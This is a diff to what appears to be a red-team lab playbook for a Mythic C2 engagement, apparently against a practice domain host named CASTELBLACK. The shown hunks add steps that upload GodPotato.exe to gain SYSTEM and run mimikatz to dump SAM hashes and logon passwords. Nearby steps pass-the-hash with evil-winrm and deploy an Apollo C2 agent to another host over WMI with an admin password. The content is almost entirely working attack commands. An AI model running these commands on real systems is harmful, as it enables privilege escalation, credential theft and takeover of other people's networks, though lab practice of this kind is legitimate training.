@@ -312,6 +312,9 @@ execute-assembly SharpUp.exe
 
 ```bash
 # Test: Run whoami as SYSTEM
+upload -path C:\windows\temp 
+Uploaded 57344 bytes to C:\Windows\Temp\GodPotato.exe on CASTELBLACK
+
 execute-assembly GodPotato.exe -cmd "cmd /c whoami"
 
 # If that works, you're SYSTEM. Continue below.
@@ -495,7 +498,7 @@ shell echo exit >> C:\Windows\Temp\m.txt
 upload /path/to/mimikatz.exe C:\Windows\Temp\mimikatz.exe
 
 # Step 3: Execute via GodPotato
-execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\m.txt"
+shell C:\Windows\Temp\GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"
 
 # Step 4: Capture output
 # Output comes back through Mythic task output
@@ -605,6 +608,8 @@ proxychains4 evil-winrm -i 10.0.0.5 -u Administrator -H NTHASH
 ```bash
 # First, upload the Apollo payload to the victim via Mythic upload
 upload /path/to/apollo.exe C:\Windows\Temp\apollo.exe
+
+upload -path C:\windows\temp
 
 # Then deploy to target using WMI or SMB
 execute-assembly GodPotato.exe -cmd "cmd /c wmic /node:10.0.0.5 /user:Administrator /password:P@ssw0rd process call create 'C:\Windows\Temp\apollo.exe'"
